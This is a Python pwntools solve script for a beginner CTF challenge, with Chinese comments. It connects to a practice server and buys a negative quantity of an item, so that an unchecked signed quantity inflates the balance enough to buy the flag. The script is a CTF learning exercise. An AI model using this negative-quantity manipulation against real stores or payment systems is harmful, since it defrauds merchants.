#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
题目 15 · 奇妙杂货铺  (Pwn 入门 / 动态环境)

漏洞: 购买数量未做 "必须为正数" 校验 (有符号整数)。
      结算 cost = price * number，balance = balance - cost。
      传入 number = -10000 时 cost = -100000，balance = 100 - (-100000) = 100100。
      再用 100100 金币买下标价 99999 的 Flag。

协议 (纯文本菜单):
  Welcome -> 菜单:  1. blood bottle (10g) / 2. Flag (99999g) / 3. Exit
  "Choice (1-3): "         -> 选 1 或 2
  "Input the number you want: " -> 数量 (可为负数 !)
  -> "--- calculating ---" / price / number / cost / Done
  -> 回到菜单; 买下 Flag 后直接输出 flag。

用法:
  source ~/re-tools/fw-env.sh
  python3 scripts/15-solve.py                 # 默认打 nc1.ctfplus.cn:25561
  python3 scripts/15-solve.py <host> <port>
"""
import re
import sys
import time

from pwn import context, remote

context.log_level = "error"

HOST = sys.argv[1] if len(sys.argv) > 1 else "nc1.ctfplus.cn"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 25561

# 负数量: cost = 10 * number = -100000  ->  balance 100 -> 100100 (> 99999)
NEG_QTY = -10000


def solve():
    r = remote(HOST, PORT)
    banner = r.recvuntil(b"Choice (1-3): ", timeout=8)
    sys.stderr.write(banner.decode(errors="replace"))

    # 1) 买负数个 blood bottle -> 余额暴涨
    r.sendline(b"1")
    r.recvuntil(b"Input the number you want: ", timeout=5)
    r.sendline(str(NEG_QTY).encode())
    time.sleep(0.4)
    out = r.recv(timeout=5)

    # 2) 买 1 个 Flag
    r.sendline(b"2")
    r.recvuntil(b"Input the number you want: ", timeout=5)
    r.sendline(b"1")
    time.sleep(0.4)
    out += r.recv(timeout=5)
    try:
        out += r.recvall(timeout=3)
    except Exception:
        pass

    text = out.decode(errors="replace")
    sys.stderr.write(text)

    # 余额校验 (证据)
    m = re.search(r"balance:\s*(-?\d+)\s*gold", text)
    balance = int(m.group(1)) if m else None

    f = re.search(r"(0xGame\{[^}]*\}|flag\{[^}]*\})", text)
    r.close()

    if not f:
        print(f"[-] flag not found (balance={balance})", file=sys.stderr)
        return 1

    flag = f.group(1)
    print(flag)
    print(f"[+] balance after negative purchase: {balance}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(solve())
